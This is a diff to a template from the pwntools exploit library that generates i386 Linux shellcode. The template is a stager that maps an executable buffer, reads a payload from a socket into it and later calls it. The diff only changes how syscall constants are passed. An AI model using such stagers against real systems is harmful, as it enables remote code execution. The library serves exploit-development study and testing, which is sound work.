@@ -1,7 +1,5 @@
 <% from pwnlib.shellcraft import common %>
 <% from pwnlib.shellcraft import i386 %>
-<% from pwnlib.shellcraft.i386 import linux %>
-<% from pwnlib.constants import SYS_mmap2, SYS_read, PROT_EXEC, PROT_WRITE, PROT_READ, MAP_ANON, MAP_PRIVATE %>
 <%docstring>
 Recives a fixed sized payload into a mmaped buffer
 Useful in conjuncion with findpeer.
@@ -17,7 +15,7 @@ Args:
 %>
 ${stager}:
     push ${sock}
-    ${i386.linux.syscall(SYS_mmap2, 0, size, PROT_EXEC+PROT_WRITE+PROT_READ,  MAP_ANON+MAP_PRIVATE, 0xffffffff, 0)}
+    ${i386.linux.syscall('SYS_mmap2', 0, size, 'PROT_EXEC | PROT_WRITE | PROT_READ', 'MAP_ANON | MAP_PRIVATE', -1, 0)}
     mov ecx, eax
     pop ebx /* sock */
     push ecx /* save for: pop eax; call eax later */
@@ -25,7 +23,7 @@ ${stager}:
 
 /* read/recv loop */
 ${looplabel}:
-    ${i386.linux.syscall(SYS_read, 'ebx', 'ecx', 'edx')}
+    ${i386.linux.syscall('SYS_read', 'ebx', 'ecx', 'edx')}
     test eax, eax
 % if handle_error:
     js ${errlabel}
